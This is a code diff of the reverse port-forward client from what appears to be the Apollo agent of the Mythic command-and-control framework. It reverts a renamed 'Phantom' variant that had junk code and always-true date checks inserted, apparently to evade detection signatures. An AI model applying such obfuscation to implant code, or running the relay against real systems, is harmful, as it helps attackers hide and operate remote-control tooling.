@@ -1,30 +1,22 @@
-﻿using PhantomInterop.Classes;
-using PhantomInterop.Interfaces;
+﻿using ApolloInterop.Classes;
+using ApolloInterop.Interfaces;
 using System;
 using System.Collections.Concurrent;
 using System.Linq;
 using System.Net.Sockets;
 using System.Threading;
 using TT = System.Threading.Tasks;
-using PhantomInterop.Enums.PhantomEnums;
-using PhantomInterop.Structs.MythicStructs;
+using ApolloInterop.Enums.ApolloEnums;
+using ApolloInterop.Structs.MythicStructs;
 using System.Net;
-using PhantomInterop.Utils;
+using ApolloInterop.Utils;
 using System.Text;
 
-namespace Phantom.Management.Rpfwd
+namespace Apollo.Management.Rpfwd
 {
     public class RpfwdClient
     {
-    private static void Xa1b2c3()
-    {
-        var x = DateTime.Now.Ticks;
-        for(int i = 0; i < 10; i++)
-        {
-            x += i * 2;
-        }
-    }
-        
+        // Rpfwd Client will be created for each new connection to the bound port in the rpfwd task
 
         private AsyncTcpClient _client;
         private TcpClient _tcpClient;
@@ -141,7 +133,7 @@ namespace Phantom.Management.Rpfwd
                 try
                 {
                     client.GetStream().EndWrite(result);
-                    
+                    // Potentially delete this since theoretically the sender Task does everything
                     if (_requestQueue.TryDequeue(out byte[] data))
                     {
                         client.GetStream().BeginWrite(data, 0, data.Length, OnDataSent, client);
@@ -181,8 +173,8 @@ namespace Phantom.Management.Rpfwd
                 data = Convert.FromBase64String(dg.Data);
             } catch (Exception ex)
             {
-                
-                if(DateTime.Now.Year > 2020) { return bRet; } else { return null; }
+                // Console.WriteLine($"Invalid b64 data from Mythic: {ex.Message}");
+                return bRet;
             }
 
             if (_client != null && !_sendRequestsTask.IsCompleted)
@@ -195,7 +187,7 @@ namespace Phantom.Management.Rpfwd
             {
                 _agent.GetTaskManager().AddTaskResponseToQueue(_task.CreateTaskResponse($"[Connection {ID}] - Data ({data.Length} Bytes) From Mythic Connection\n{Encoding.UTF8.GetString(data)}\n\n", false));
             }
-            if(DateTime.Now.Year > 2020) { return bRet; } else { return null; }
+            return bRet;
         }
     }
 }
